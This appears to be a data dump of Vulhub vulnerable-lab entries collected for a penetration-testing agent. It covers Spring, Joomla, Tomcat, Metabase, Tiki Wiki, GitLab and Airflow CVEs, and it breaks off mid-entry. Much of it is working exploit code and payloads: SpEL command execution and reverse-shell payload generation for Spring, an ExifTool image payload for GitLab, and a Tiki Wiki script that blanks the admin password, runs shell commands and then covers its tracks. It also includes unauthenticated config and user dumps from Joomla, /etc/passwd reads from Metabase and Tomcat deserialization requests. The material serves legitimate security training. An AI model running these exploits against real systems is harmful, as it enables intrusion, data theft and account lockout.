    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2018-1270/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2018-1270/exploit.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2018-1270/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-messaging:5.0.4\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2018-1270/exploit.py\n\n- Extension: .py\n- Language: python\n- Size: 2092 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\nimport requests\nimport random\nimport string\nimport time\nimport threading\nimport logging\nimport sys\nimport json\n\nlogging.basicConfig(stream=sys.stdout, level=logging.INFO)\n\ndef random_str(length):\n    letters = string.ascii_lowercase + string.digits\n    return ''.join(random.choice(letters) for c in range(length))\n\n\nclass SockJS(threading.Thread):\n    def __init__(self, url, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'\n        self.daemon = True\n        self.session = requests.session()\n        self.session.headers = {\n            'Referer': url,\n            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'\n        }\n        self.t = int(time.time()*1000)\n\n    def run(self):\n        url = f'{self.base}/htmlfile?c=_jp.vulhub'\n        response = self.session.get(url, stream=True)\n        for line in response.iter_lines():\n            time.sleep(0.5)\n    \n    def send(self, command, headers, body=''):\n        data = [command.upper(), '\\n']\n\n        data.append('\\n'.join([f'{k}:{v}' for k, v in headers.items()]))\n        \n        data.append('\\n\\n')\n        data.append(body)\n        data.append('\\x00')\n        data = json.dumps([''.join(data)])\n\n        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)\n        if response.status_code != 204:\n            logging.info(f\"send '{command}' data error.\")\n        else:\n            logging.info(f\"send '{command}' data success.\")\n\n    def __del__(self):\n        self.session.close()\n\n\nsockjs = SockJS('http://your-ip:8080/gs-guide-websocket')\nsockjs.start()\ntime.sleep(1)\n\nsockjs.send('connect', {\n    'accept-version': '1.1,1.0',\n    'heart-beat': '10000,10000'\n})\nsockjs.send('subscribe', {\n    'selector': \"T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\",\n    'id': 'sub-0',\n    'destination': '/topic/greetings'\n})\n\ndata = json.dumps({'name': 'vulhub'})\nsockjs.send('send', {\n    'content-length': len(data),\n    'destination': '/app/hello'\n}, data)\n\n```\n\n",
    "readme": "# Spring Messaging Remote Code Execution (CVE-2018-1270)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring Messaging provides messaging support for the Spring framework, with STOMP as its upper-layer protocol and SockJS as its underlying communication layer.\n\nIn Spring Messaging, clients are allowed to subscribe to messages and filter them using selectors. These selectors are written in SpEL (Spring Expression Language) and parsed using `StandardEvaluationContext`, which leads to a remote code execution vulnerability.\n\nReference links:\n\n- https://pivotal.io/security/cve-2018-1270\n- https://xz.aliyun.com/t/2252\n- https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12\n- https://github.com/CaledoniaProject/CVE-2018-1270\n\n## Vulnerability Environment\n\nExecute the following command to start a vulnerable Web application based on Spring Messaging 5.0.4:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080` to see a web page.\n\n## Vulnerability Reproduce\n\nWhile many articles state that Spring Messaging is based on WebSocket communication, this is not entirely accurate. Spring Messaging is based on SockJS (which can be understood as a communication protocol), and SockJS adapts to different browsers: modern browsers use WebSocket communication, while older browsers use AJAX communication.\n\nThe process of connecting to the backend server can be understood as:\n\n1. Using the [STOMP protocol](http://jmesnil.net/stomp-websocket/doc/) to combine data into a text stream\n2. Using the [SockJS protocol](https://github.com/sockjs/sockjs-client) to send the text stream, where SockJS chooses an appropriate channel (WebSocket or XHR/HTTP) to communicate with the backend\n\nTherefore, we can use HTTP to reproduce the vulnerability, which we call a \"downgrade attack\".\n\nI have written a simple POC script [exploit.py](exploit.py) (requires Python 3.6 or higher to execute). Since this vulnerability involves inserting a SpEL expression during subscription, and it is only triggered when a message is sent to this subscription, we need to specify the following information:\n\n1. Base URL, which in Vulhub is `http://your-ip:8080/gs-guide-websocket`\n2. The SpEL expression to execute, such as `T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')`\n3. A subscription address, which in Vulhub is: `/topic/greetings`\n4. How to trigger this subscription, i.e., how to make the backend send a message to this subscription. In Vulhub, we send a JSON containing a name to `/app/hello` to trigger this event. Of course, this would be different in real-world scenarios, so this POC is not universally applicable.\n\nModify the POC according to your needs. If you're using the Vulhub environment, you only need to modify the URL in step 1.\n\nExecute:\n\n![](1.png)\n\nEnter the container with `docker compose exec spring bash`, and you can see that `/tmp/success` has been successfully created:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2016-4977.md",
    "filenamenomd": "CVE-2016-4977",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2016-4977/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2016-4977/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2016-4977/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 287 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python\n\nmessage = input('Enter message to encode:')\n\npoc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])\n\nfor ch in message[1:]:\n   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) \n\npoc += ')}'\n\nprint(poc)\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2016-4977/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 105 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n spring:\n   image: vulhub/spring-security-oauth2:2.0.8\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Spring Security OAuth2 Remote Command Execution Vulnerability (CVE-2016-4977)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring Security OAuth provides support for using Spring Security with OAuth (1a) and OAuth2 using standard Spring and Spring Security programming models and configuration idioms.\n\nIn its use of whitelabel views for error handling, an remote attacker can execute commands by constructing malicious parameters through the Springs Expression Language (SpEL).\n\nReference links.\n\n- http://secalert.net/#CVE-2016-4977\n- https://deadpool.sh/2017/RCE-Springs/\n- http://blog.knownsec.com/2016/10/spring-security-oauth-rce/\n\n## Vulnerability environment\n\nExecute the following command to start a Spring Security OAuth application.\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the ``http://your-ip:8080/`` to see its home page.\n\n## Exploit\n\nRequest to the `http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test`, first you need to fill in the username and password, we just fill in `admin:admin` here.\n\nAs you can see, SpEL expression `${233*233}` has been successfully executed and returned the result.\n\n![](1.png)\n\nWe then use [poc.py](poc.py) to generate an EXP for the [reverse shell](http://www.jackson-t.ca/runtime-exec-payloads.html):\n\n![](2.png)\n\nAs above, a long SpEL expression exploit is generated. Send the request with this SpEL exploit, a reverse shell is gained:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2023-23752.md",
    "filenamenomd": "CVE-2023-23752",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/joomla/CVE-2023-23752/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/joomla/CVE-2023-23752/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 346 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/joomla:4.2.7\n   depends_on:\n    - mysql\n   environment: \n    - JOOMLA_DB_HOST=mysql\n    - JOOMLA_DB_PORT=3306\n    - JOOMLA_DB_USER=root\n    - JOOMLA_DB_PASSWORD=vulhub\n    - JOOMLA_DB_NAME=joomla\n   ports:\n    - \"8080:80\"\n mysql:\n   image: mysql:5.7\n   environment: \n    - MYSQL_ROOT_PASSWORD=vulhub\n\n```\n\n",
    "readme": "# Joomla improper access check in webservice endpoints (CVE-2023-23752)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJoomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.\n\nAn issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.\n\nReferences:\n\n- <https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html>\n- <https://xz.aliyun.com/t/12175>\n- <https://vulncheck.com/blog/joomla-for-rce>\n\n## Vulnerable Environment\n\nExecute following command to start a Joomla site 4.2.7:\n\n```\ndocker compose up -d\n```\n\nYou can access the Joomla website through `http://your-ip:8080` after the server is started.\n\n## Exploit\n\nThis issue is caused by an attribute overwrite issue, the attacker can use `public=true` to bypass the authorization check.\n\nFor example, expose all configuration including MySQL username and password through this link:\n\n```\nhttp://your-ip:8080/api/index.php/v1/config/application?public=true\n```\n\n![](1.png)\n\nOtherwise access is unauthorized without `public=true`：\n\n![](2.png)\n\nExpose all users information including emails through this link:\n\n```\nhttp://your-ip:8080/api/index.php/v1/users?public=true\n```\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2025-24813.md",
    "filenamenomd": "CVE-2025-24813",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2025-24813/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2025-24813/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2025-24813/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 59 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n tomcat:\n   build: .\n   ports:\n    - \"8080:8080\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2025-24813/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 542 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/tomcat:9.0.97\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && sed -i '/<load-on-startup>1<\\/load-on-startup>/i \\        <init-param>\\n            <param-name>readonly</param-name>\\n            <param-value>false</param-value>\\n        </init-param>' /usr/local/tomcat/conf/web.xml \\\n    && sed -i '/<\\/Context>/i \\    <Manager className=\"org.apache.catalina.session.PersistentManager\">\\n        <Store className=\"org.apache.catalina.session.FileStore\"/>\\n    </Manager>' /usr/local/tomcat/conf/context.xml\n\n```\n\n",
    "readme": "# Tomcat Session Deserialization Remote Code Execution (CVE-2025-24813)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Tomcat is a widely used open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language, and WebSocket technologies.\n\nA deserialization vulnerability was found in Apache Tomcat from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98. It occurs when Tomcat is configured with both writable DefaultServlet (readonly=false) and file-based session persistence. The combination allows attackers to write arbitrary files to the server and trigger deserialization of these files by manipulating the JSESSIONID cookie, ultimately leading to remote code execution.\n\n- <https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq>\n- <https://github.com/charis3306/CVE-2025-24813>\n- <https://forum.butian.net/article/674>\n\n## Environment Setup\n\nExecute the following commands to start a vulnerable Tomcat 9.0.97 server:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server starts, you can access the Tomcat example page by visiting `http://your-ip:8080`.\n\n## Vulnerability Reproduction\n\nThe vulnerability exists due to two key misconfigurations in Tomcat. First, the DefaultServlet is configured with readonly=false, allowing file uploads:\n\n```xml\n<servlet>\n    <servlet-name>default</servlet-name>\n    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n    <init-param>\n        <param-name>debug</param-name>\n        <param-value>0</param-value>\n    </init-param>\n    <init-param>\n        <param-name>listings</param-name>\n        <param-value>false</param-value>\n    </init-param>\n    <init-param>\n        <param-name>readonly</param-name>\n        <param-value>false</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n</servlet>\n```\n\nSecond, Tomcat is configured to use file-based session persistence.\n\n```xml\n<Manager className=\"org.apache.catalina.session.PersistentManager\">\n    <Store className=\"org.apache.catalina.session.FileStore\"/>\n</Manager>\n```\n\nBoth configurations use the same default storage path: `$CATALINA_BASE/work/Catalina/localhost/ROOT`.\n\nWhen sending a partial PUT request, Tomcat converts path separators (/) in the file path to periods (.) and temporarily stores the file in the session storage directory. By crafting a specific request, we can write a malicious serialized object to this directory.\n\nTo exploit this vulnerability, first send a partial PUT request with the Content-Range header to write a file named `.deserialize.session` in the temporary directory (I use the URLDNS gadget for testing purposes):\n\n```\nPUT /deserialize/session HTTP/1.1\nHost: your-ip:8080\nContent-Length: 1234\nContent-Range: bytes 0-5/10\n\ndeserialize content\n```\n\n![](1.png)\n\nThen, send another request with a manipulated JSESSIONID cookie to trigger deserialization of the file:\n\n```\nGET / HTTP/1.1\nHost: your-ip:8080\nCookie: JSESSIONID=.deserialize\n\n\n```\n\n![](2.png)\n\nAs you can see, the URLDNS gadget is successfully deserialized, and the DNS request is sent:\n\n![](3.png)\n\nIn a real attack scenario, the \"deserialize content\" would be replaced with a malicious serialized Java object that can execute arbitrary code when deserialized by web applications.\n"
  },
  {
    "filename": "CVE-2021-41277.md",
    "filenamenomd": "CVE-2021-41277",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/metabase/CVE-2021-41277/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/metabase/CVE-2021-41277/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 95 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/metabase:0.40.4\n    ports:\n      - \"3000:3000\"\n\n```\n\n",
    "readme": "# Metabase Pre-Auth Local File Inclusion (CVE-2021-41277)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nMetabase is an open source data analytics platform. In affected versions (x.40.0-x.40.4) a security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support, unauthenticated attackers can use this vulnerability to read local file (including environment variables).\n\nReferences:\n\n- <https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr>\n- <https://github.com/tahtaciburak/CVE-2021-41277>\n\n## Environment Setup\n\nExecute following command to start a Metabase server 0.40.4:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can browse the `http://your-ip:3000` to see the installation instructions like that:\n\n![](1.png)\n\nFill in your information, and skip the data source form.\n\n## Vulnerability Reproduce\n\nSimplely use the CURL to exploit this flaw:\n\n```\ncurl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd\n```\n\nAs you can see, `/etc/passwd` has been exposed successfully.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-15906.md",
    "filenamenomd": "CVE-2020-15906",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/tikiwiki/CVE-2020-15906/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/tikiwiki/CVE-2020-15906/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/tikiwiki/CVE-2020-15906/docker-entrypoint.sh\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tikiwiki/CVE-2020-15906/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 2763 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport requests\nimport sys\nimport re\n\n\ndef auth_bypass(s, t):\n    d = {\n        \"ticket\" : \"\",\n        \"user\" : \"admin\",\n        \"pass\" : \"trololololol\",\n    }\n    h = { \"referer\" : t }\n    d[\"ticket\"] = get_ticket(s, \"%stiki-login.php\" % t)\n    d[\"pass\"] = \"\" # blank login\n    r = s.post(\"%stiki-login.php\" % t, data=d, headers=h)\n    r = s.get(\"%stiki-admin.php\" % t)\n    assert (\"You do not have the permission that is needed\" not in r.text), \"(-) authentication bypass failed!\"\n\ndef black_password(s, t):\n    uri = \"%stiki-login.php\" % t\n    # setup cookies here\n    s.get(uri)\n    ticket = get_ticket(s, uri)\n    d = {\n        'user':'admin', \n        'pass':'trololololol',\n    }\n    # crafted especially so unsuccessful_logins isn't recorded\n    for i in range(0, 51):\n        r = s.post(uri, d)\n        if(\"Account requires administrator approval.\" in r.text):\n            print(\"(+) admin password blanked!\")\n            return\n    raise Exception(\"(-) auth bypass failed!\") \n\ndef get_ticket(s, uri):\n    h = { \"referer\" : uri }\n    r = s.get(uri)\n    match = re.search('class=\"ticket\" name=\"ticket\" value=\"(.*)\" \\/>', r.text)\n    assert match, \"(-) csrf ticket leak failed!\"\n    return match.group(1)\n\ndef trigger_or_patch_ssti(s, t, c=None):\n    # CVE-2021-26119\n    p = { \"page\": \"look\" }\n    h = { \"referer\" : t }\n    bypass = \"startrce{$smarty.template_object->smarty->disableSecurity()->display('string:{shell_exec(\\\"%s\\\")}')}endrce\" % c\n    d = {\n        \"ticket\" : get_ticket(s, \"%stiki-admin.php\" % t),\n        \"feature_custom_html_head_content\" : bypass if c else '',\n        \"lm_preference[]\": \"feature_custom_html_head_content\"\n    }\n    r = s.post(\"%stiki-admin.php\" % t, params=p, data=d, headers=h)\n    r = s.get(\"%stiki-index.php\" % t)\n    if c != None:\n        assert (\"startrce\" in r.text and \"endrce\" in r.text), \"(-) rce failed!\"\n        cmdr = r.text.split(\"startrce\")[1].split(\"endrce\")[0]\n        print(cmdr.strip())\n\ndef main():\n    if(len(sys.argv) < 4):\n        print(\"(+) usage: %s <host> <path> <cmd>\" % sys.argv[0])\n        print(\"(+) eg: %s 192.168.75.141 / id\"% sys.argv[0])\n        print(\"(+) eg: %s 192.168.75.141 /tiki-20.3/ id\" % sys.argv[0])\n        return\n    p = sys.argv[2]\n    c = sys.argv[3]\n    p = p + \"/\" if not p.endswith(\"/\") else p\n    p = \"/\" + p if not p.startswith(\"/\") else p\n    t = \"http://%s%s\" % (sys.argv[1], p)\n    s = requests.Session()\n    print(\"(+) blanking password...\")\n    black_password(s, t)\n    print(\"(+) getting a session...\")\n    auth_bypass(s, t)\n    print(\"(+) auth bypass successful!\")\n    print(\"(+) triggering rce...\\n\")\n    # trigger for rce\n    trigger_or_patch_ssti(s, t, c)\n    # patch so we stay hidden\n    trigger_or_patch_ssti(s, t)\n\nif __name__ == '__main__':\n    main()\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tikiwiki/CVE-2020-15906/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 501 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/tikiwiki:21.1\n   entrypoint: \n    - bash\n    - /docker-entrypoint.sh\n   depends_on:\n    - db\n   ports:\n    - \"8080:80\"\n   environment: \n    - TIKI_DB_DRIVER=pdo\n    - TIKI_DB_HOST=db\n    - TIKI_DB_USER=root\n    - TIKI_DB_PASS=root\n    - TIKI_DB_NAME=tikiwiki\n   volumes:\n    - \"./docker-entrypoint.sh:/docker-entrypoint.sh\"\n db:\n   image: mysql:5.7\n   environment: \n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=tikiwiki\n   ports:\n    - \"3306:3306\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tikiwiki/CVE-2020-15906/docker-entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 345 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nwait-for-it db:3306 -- echo \"database is up\"\n\nif [[ ! -e ./db/local.php ]]; then\n    php console.php database:configure --host db -- root root tikiwiki\n    php console.php database:install\n    php console.php users:password -- admin vulhub\n    php console.php index:rebuild\n    php console.php installer:lock\nfi\n\napache2-foreground\n\n```\n\n",
    "readme": "# Tiki Wiki CMS Groupware 21.1 Authentication Bypass (CVE-2020-15906)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nTiki Wiki CMS Groupware or simply Tiki, originally known as TikiWiki, is a free and open source Wiki-based content management system and online office suite written primarily in PHP and distributed under the GNU Lesser General Public License (LGPL) license.\n\nThere is a new vulnerability in TikiWiki Cms Groupware 16.x - 21.1. It allows remote unauthenticated attackers to bypass the login page which results in a full compromise of Tiki Wiki CMS. An Attacker is able to bruteforce the Admin account until it is locked. After that an empty Password can be used to authenticate as admin to get access.\n\nReferences:\n\n- https://info.tiki.org/article473-Security-Releases-of-all-Tiki-versions-since-16-3\n- https://github.com/S1lkys/CVE-2020-15906\n- http://packetstormsecurity.com/files/159663/Tiki-Wiki-CMS-Groupware-21.1-Authentication-Bypass.html\n- https://srcincite.io/pocs/cve-2021-26119.py.txt\n\n## Vulnerable environment\n\nExecute following commands to start a Tiki Wiki CMS 21.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is running, browser the `http://your-ip:8080` to see the welcome page.\n\n## Exploit\n\n[POC](https://srcincite.io/pocs/cve-2021-26119.py.txt) comblines two bugs which lead to remote code execution:\n\nBug 1: CVE-2020-15906\n    - An unauthenticated user can bypass the authentication by bruteforcing the admin account > 50 times and login with a blank password\n    - Works on: <= 21.1 (UY_Scuti)\n\nBug 2: CVE-2021-26119\n    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the 'template_object' property\n    - Works on: <= 22.2 (Corona_Borealis) and impacts Smarty <= 3.1.38 (latest)\n\n```shell\npython poc.py your-ip:8080 / id\n```\n\n![](1.png)\n\n*WARNING* This exploit will lock out the administrator account.\n"
  },
  {
    "filename": "CVE-2021-22205.md",
    "filenamenomd": "CVE-2021-22205",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2021-22205/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2021-22205/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2021-22205/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 1355 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport sys\nimport re\nimport requests\n\n\ntarget = sys.argv[1]\ncommand = sys.argv[2]\nsession = requests.session()\nCSRF_PATTERN = re.compile(rb'csrf-token\" content=\"(.*?)\" />')\n\ndef get_payload(command):\n    rce_payload = b'\\x41\\x54\\x26\\x54\\x46\\x4f\\x52\\x4d'\n    rce_payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)\n    rce_payload += b'\\x44\\x4a\\x56\\x55\\x49\\x4e\\x46\\x4f\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x18\\x00\\x2c\\x01\\x16\\x01\\x42\\x47\\x6a\\x70\\x00\\x00\\x00\\x00\\x41\\x4e\\x54\\x61'\n    rce_payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)\n    rce_payload += b'\\x28\\x6d\\x65\\x74\\x61\\x64\\x61\\x74\\x61\\x0a\\x09\\x28\\x43\\x6f\\x70\\x79\\x72\\x69\\x67\\x68\\x74\\x20\\x22\\x5c\\x0a\\x22\\x20\\x2e\\x20\\x71\\x78\\x7b'\n    rce_payload += command.encode()\n    rce_payload += b'\\x7d\\x20\\x2e\\x20\\x5c\\x0a\\x22\\x20\\x62\\x20\\x22\\x29\\x20\\x29\\x0a'\n    return rce_payload\n\ndef csrf_token():\n    response = session.get(f'{target}/users/sign_in', headers={'Origin': target})\n    g = CSRF_PATTERN.search(response.content)\n    assert g, 'No CSRF Token found'\n\n    return g.group(1).decode()\n\n\ndef exploit():\n    files = [('file', ('test.jpg', get_payload(command), 'image/jpeg'))]\n    session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': csrf_token()})\n\n\nif __name__ == '__main__':\n    exploit()\n    print('finish test')\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2021-22205/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 1140 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2.3'\n\nservices:\n  redis:\n    image: redis:5.0.9-alpine\n\n  postgresql:\n    image: postgres:12-alpine\n    environment:\n    - POSTGRES_USER=gitlab\n    - POSTGRES_PASSWORD=password\n    - POSTGRES_DB=gitlabhq_production\n    - DB_EXTENSION=pg_trgm,btree_gist\n\n  gitlab:\n    image: vulhub/gitlab:13.10.1\n    depends_on:\n    - redis\n    - postgresql\n    ports:\n    - \"8080:80\"\n    - \"10022:22\"\n    environment:\n    - DEBUG=false\n\n    - DB_ADAPTER=postgresql\n    - DB_HOST=postgresql\n    - DB_PORT=5432\n    - DB_USER=gitlab\n    - DB_PASS=password\n    - DB_NAME=gitlabhq_production\n\n    - REDIS_HOST=redis\n    - REDIS_PORT=6379\n\n    - GITLAB_HTTPS=false\n    - SSL_SELF_SIGNED=false\n\n    - GITLAB_HOST=localhost\n    - GITLAB_PORT=8080\n    - GITLAB_SSH_PORT=10022\n    - GITLAB_RELATIVE_URL_ROOT=\n    - GITLAB_SECRETS_DB_KEY_BASE=long-long-long-long-long-long-secret-key-is-here1\n    - GITLAB_SECRETS_SECRET_KEY_BASE=long-long-long-long-long-long-secret-key-is-here2\n    - GITLAB_SECRETS_OTP_KEY_BASE=long-long-long-long-long-long-secret-key-is-her3\n\n    - TZ=Asia/Kolkata\n    - GITLAB_TIMEZONE=Kolkata\n    - GITLAB_ROOT_PASSWORD=vulhub123456\n\n```\n\n",
    "readme": "# GitLab Pre-Auth Remote Command Execution (CVE-2021-22205)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGitLab is a web-based DevOps lifecycle tool that provides a Git repository manager providing wiki, issue-tracking and continuous integration and deployment pipeline features.\n\nAn issue has been discovered in GitLab CE/EE affecting the versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in an unauthenticated remote command execution.\n\nReferences:\n\n- https://hackerone.com/reports/1154542\n- https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html\n- https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/\n- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml\n\n## Vulnerable environment\n\nExecute following command to start a GitLab Community Server 13.10.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:8080` to see the website.\n\n## Exploit\n\nThe api endpoint `/uploads/user` is an unauthenticated interface. Attack the server through the [poc.py](poc.py):\n\n```\npython poc.py http://your-ip:8080 \"touch /tmp/success\"\n```\n\n![](1.png)\n\n`touch /tmp/success` has been executed successfully:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-17526.md",
    "filenamenomd": "CVE-2020-17526",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-17526/init-user.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-17526/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-17526/init-user.py\n\n- Extension: .py\n- Language: python\n- Size: 424 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python\nimport os\nfrom airflow import models, settings\nfrom airflow.contrib.auth.backends.password_auth import PasswordUser\n\nos.system('/entrypoint initdb')\n\nuser = PasswordUser(models.User())\nuser.username = 'vulhub'\nuser.email = 'vulhub@example.com'\nuser.password = 'vulhub'\nuser.superuser = True\nsession = settings.Session()\nsession.add(user)\nsession.commit()\nsession.close()\nprint('initial user finished')\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-17526/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 2435 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '3'\nx-airflow-common:\n  &airflow-common\n  image: vulhub/airflow:1.10.10\n  environment:\n    &airflow-common-env\n    AIRFLOW__CORE__EXECUTOR: CeleryExecutor\n    AIRFLOW__CORE__SQL_ALCHEMY_CONN: postgresql+psycopg2://airflow:airflow@postgres/airflow\n    AIRFLOW__CELERY__RESULT_BACKEND: db+postgresql://airflow:airflow@postgres/airflow\n    AIRFLOW__CELERY__BROKER_URL: redis://:@redis:6379/0\n    AIRFLOW__CORE__FERNET_KEY: ''\n    